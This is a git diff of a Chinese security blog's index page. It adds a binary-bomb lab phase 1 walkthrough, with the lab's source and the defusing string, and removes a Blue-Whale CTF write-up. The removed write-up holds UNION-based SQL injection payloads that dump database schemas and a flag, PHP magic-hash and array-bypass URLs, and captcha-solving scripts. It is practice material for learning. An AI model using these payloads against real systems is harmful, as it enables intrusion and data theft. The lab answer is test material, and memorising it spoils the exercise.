@@ -228,6 +228,142 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Richard LEE">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RichardLEE's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/" itemprop="url">二进制炸弹-phase1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-23T19:32:18+08:00">
+                2020-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>拿到这个二进制炸弹先运行一下。</p>
+<p><img src="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/1.png" alt></p>
+<p>发的炸弹里还有一个bomb.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"support.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"phases.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">	infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can't call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">				      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn't something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接给出了炸弹的main函数，浏览一下就可以知道，炸弹一共分为六关，每一关都是读取输入参数进行判断，如果输入不正确就引爆炸弹。</p>
+<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>首先使用gdb加载炸弹，根据对main函数的分析可以梳理简单的思路，先在phase_1函数下断点。</p>
+<p><img src="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/2.png" alt></p>
+<p>run之后发现程序在phase_1处断下，然后可以观察此处反汇编：</p>
+<p><img src="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/3.PNG" alt></p>
+<p>可以看出phase_1函数mov了一个位于0x804a1e4地址的字符，然后call了一个函数<string_not_equal>，这个函数顾名思义应该是一个比较函数，如果两个字符串相等那么eax置零，跳转到下一个判断函数，否则调用<explode_bomb>引爆炸弹。</explode_bomb></string_not_equal></p>
+<p>到此为止第一关的思路很清晰了，找到0x804a1e4的字符串即可，使用IDA打开phase_1函数：</p>
+<p><img src="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/4.png" alt></p>
+<p>0x804a1e4存储的内容已经给出，输入以下内容即可进入第二关：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Houses will begat jobs, jobs will begat houses.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9-phase1/5.png" alt></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/20/Invisible-flag/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1416,246 +1552,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Richard LEE">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="RichardLEE's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" itemprop="url">Blue-Whale CTF Writeup 持续更新</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-11T14:40:53+08:00">
-                2020-03-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>这篇博客将记录Blue-Whale OJ的writeups，由于我在本科期间参加过一些比赛，有一点CTF经验，所以主要记录解题过程和思路，以及需要学习或者复习的知识。主要打算刷Web、Crypto、MISC，直到刷不动了为止。</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Welcome-to-Web"><a href="#Welcome-to-Web" class="headerlink" title="Welcome to Web"></a>Welcome to Web</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>($_GET[<span class="string">'key'</span>] == <span class="string">'areyousure'</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'For this exercise, flag is: ******'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Web签到题，考察点为以Get形式传递参数，URL就是Get请求，因此直接构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vps1.blue-whale.me:23331&#x2F;php0&#x2F;?key&#x3D;areyousure</span><br></pre></td></tr></table></figure>
-
-<h2 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h2><p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" alt></p>
-<p>要求在1.5s内完成计算，可以利用Python的requests库来解决。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">'http://vps1.blue-whale.me:23331/calculator/'</span></span><br><span class="line">r = requests.session()</span><br><span class="line">requestpage = r.get(url)</span><br><span class="line">ans = re.findall(<span class="string">'&lt;span id="exp"&gt;(.*?) = &lt;/span&gt;'</span>, requestpage.text)</span><br><span class="line">ans=<span class="string">""</span>.join(ans)</span><br><span class="line">ans=ans[:<span class="number">-2</span>]</span><br><span class="line">post=eval(ans)</span><br><span class="line">data=&#123;<span class="string">'value'</span>:post&#125;</span><br><span class="line">flag=r.post(url, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-
-<p>思考：服务器怎么知道获得算式的和提交答案的是一个人？</p>
-<p>可以验证Cookie，服务器端验证的话request.Session即可。</p>
-<p>另：暂时没想出不用Python的办法。</p>
-<h2 id="RapidTyping"><a href="#RapidTyping" class="headerlink" title="RapidTyping"></a>RapidTyping</h2><p>一开始毫无头绪，后来发现源代码里这个验证码是个base64编码的图片，base64解码之后发现由一堆<line></line>和<text>标签构成，很显然text标签内就是验证码的文字，line标签则是干扰线。由于题目还要求2.5s内完成验证码的输入，因此整理思路。</text></p>
-<p>1.利用Python requests库获得网页源码。</p>
-<p>2.利用正则表达式筛出base64编码。</p>
-<p>3.base64解码。</p>
-<p>4.提取出text标签内的字母。</p>
-<p>5.把提取出的字母排序拼接组成验证码。</p>
-<p>6.提交验证码</p>
-<p>根据上述思路写代码即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = requests.Session()</span><br><span class="line">htm = session.get(<span class="string">'http://vps1.blue-whale.me:23331/captcha/'</span>)</span><br><span class="line">htm = htm.text</span><br><span class="line">print(htm)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到base64</span></span><br><span class="line">bas = re.findall(<span class="string">r'base64,(.*?)" /&gt;&lt;/p&gt;'</span>,htm)</span><br><span class="line">basstr = <span class="string">''</span>.join(bas)</span><br><span class="line">print(basstr)</span><br><span class="line"><span class="comment">#base64解码</span></span><br><span class="line">decod = base64.b64decode(basstr)</span><br><span class="line">print(decod)</span><br><span class="line"><span class="comment">#提取test标签</span></span><br><span class="line">tex=re.findall(<span class="string">r'&lt;text.*?&lt;/text&gt;'</span>,str(decod))</span><br><span class="line">print(tex)</span><br><span class="line">print(len(tex))</span><br><span class="line"></span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">sortx = sorted(tex,key=<span class="keyword">lambda</span> i:int(re.search(<span class="string">r'x="(\d+)'</span>,i).group(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">print</span> (sortx)</span><br><span class="line"></span><br><span class="line"><span class="comment">#提取字符拼接</span></span><br><span class="line">fin = <span class="string">''</span>.join(sortx)</span><br><span class="line">print(fin)</span><br><span class="line">finpj = re.findall(<span class="string">r'&gt;(\w)&lt;/text&gt;'</span>,fin)</span><br><span class="line">print(finpj)</span><br><span class="line">finpjstr=<span class="string">''</span>.join(finpj)</span><br><span class="line">print(finpjstr)</span><br><span class="line"><span class="comment">#提交验证码获取flag</span></span><br><span class="line">result1 = &#123;<span class="string">'code'</span>: finpjstr&#125;</span><br><span class="line">r =session.get(<span class="string">"http://vps1.blue-whale.me:23331/captcha/"</span>, params=result1)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Basic-SQL"><a href="#Basic-SQL" class="headerlink" title="Basic SQL"></a>Basic SQL</h2><p>打开网页发现Search News可以输入搜索，怀疑注入点在这里，抓包发现是POST请求，这个题应该是POST注入。</p>
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" alt></p>
-<p>首先测试一下这个表有几列，过程省略，测得有3列：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="keyword">CONCAT</span>(<span class="string">'test'</span>,<span class="string">'12343242423423'</span>),<span class="string">'test'</span>),<span class="literal">NULL</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>第二步，回显数据库：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x7e</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(schema_name <span class="keyword">AS</span> <span class="keyword">NCHAR</span>),<span class="number">0x20</span>),<span class="number">0x7e</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>第三步，回显表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x7e</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_name <span class="keyword">AS</span> <span class="keyword">NCHAR</span>),<span class="number">0x20</span>),<span class="number">0x7e</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema <span class="keyword">IN</span> (<span class="number">0x6e657773</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>第四步，回显字段名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x7e</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(column_name <span class="keyword">AS</span> <span class="keyword">NCHAR</span>),<span class="number">0x20</span>),<span class="number">0x7e</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name=<span class="number">0x66316167666c346768657233</span> <span class="keyword">AND</span> table_schema=<span class="number">0x6e657773</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>第五步，拿flag：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="keyword">CONCAT</span>(<span class="number">0x7e</span>,<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(h3r31sfl4g <span class="keyword">AS</span> <span class="keyword">NCHAR</span>),<span class="number">0x20</span>),<span class="number">0x7e</span>),<span class="literal">NULL</span> <span class="keyword">FROM</span> news.f1agfl4gher3<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/11/Blue-Whale-CTF-Writeup-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" alt></p>
-<h2 id="Basic-PHP"><a href="#Basic-PHP" class="headerlink" title="Basic PHP"></a>Basic PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'test'</span>]))&#123; </span><br><span class="line">    <span class="comment">// ========== Stage 1 ==========  </span></span><br><span class="line">    $test=$_GET[<span class="string">'test'</span>];  </span><br><span class="line">    $test=md5($test);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($test==<span class="string">'0'</span>) &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>;  </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== Stage 2 ==========  </span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>; </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>; </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>; </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>其实是两个php trick组合到了一起，Stage1:</p>
-<p>考察了PHP的hash漏洞，以0e开头的hash值会被当作科学记数法处理，例如QNKCDZO<strong>=</strong>0e830400451993494058024219903391</p>
-<p>Stage2:</p>
-<p>考察了php中md5()、sha1()函数无法处理数组，直接返回NULL，因此可以利用数组绕过，例如name[]=1&amp;password[]=2</p>
-<p>综上，此题payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vps1.blue-whale.me:23331&#x2F;feature&#x2F;?name[]&#x3D;1&amp;password[]&#x3D;2&amp;test&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>
-
-<h2 id="Basic-PHP-2"><a href="#Basic-PHP-2" class="headerlink" title="Basic PHP 2"></a>Basic PHP 2</h2><p>要求输入自己的名字，随便输点东西就可以，然后出现如下代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123; </span><br><span class="line">    $filename = <span class="string">'config.php'</span>; </span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_int(stripos($content, <span class="string">'php'</span>)) || is_int(stripos($content, <span class="string">'&lt;'</span>))) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid input'</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        file_put_contents($filename, $content); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>strpos() 函数为查找字符串在另一字符串中第一次出现的位置，可以通过数组进行绕过，从而满足(is_int(stripos($content, ‘php’)) || is_int(stripos($content, ‘&lt;’)))为false。此题payload为：</p>
